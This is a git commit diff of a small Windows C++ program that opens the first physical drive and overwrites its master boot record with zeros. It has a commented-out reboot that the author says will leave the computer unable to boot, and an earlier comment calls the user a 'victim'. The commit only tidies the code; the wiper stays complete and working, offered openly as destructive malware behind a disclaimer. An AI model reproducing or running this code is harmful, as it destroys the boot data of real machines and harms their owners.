b9d75837716364ab6c691853ccb1d13470bdf584
Spar <74677348+Sparpvp@users.noreply.github.com>
2021-09-14 14:18:46 +0200

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -6,15 +6,13 @@ I dissociate myself from any illegal use of this file.
 #include <Windows.h>
 #include <iostream>
 
-using namespace std;
-
 #define MBR_SIZE 512
 
 int main(){
-    DWORD write;
+    DWORD bytesWritten;
     char mbrData[MBR_SIZE];
 
-    ZeroMemory(&mbrData, (sizeof mbrData));
+    ZeroMemory(&mbrData, sizeof(mbrData));
     
     HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0",
 				 GENERIC_ALL,
@@ -24,18 +22,18 @@ int main(){
 				 NULL,
 				 NULL
 				 );
-if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
-	cout << "Master Boot Record was overwritten!";
-	Sleep(1000);
+if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &bytesWritten, NULL)) {
+	std::cout << "Master Boot Record was overwritten!";
 	CloseHandle(MasterBootRecord);
-	//system("shutdown -r -t 00"); //Restarting pc after master boot record overwritten will cause a fatal error. Victim won't be able to start his computer again. Uncomment if you want this result instantly. 
+	Sleep(1000);
+	//system("shutdown -r -t 00"); //Restarting pc after master boot record overwritten will cause a fatal error. Computer won't boot again. Uncomment if you want this result instantly. 
 	ExitProcess(0);
 
 }
 else {
-	cout << "Start me as administrator! Failed code execution.";
-	Sleep(5000);
+	std::cout << "Start me as administrator! Failed code execution.";
 	CloseHandle(MasterBootRecord);
+	Sleep(5000);
 	ExitProcess(0);
 }
 
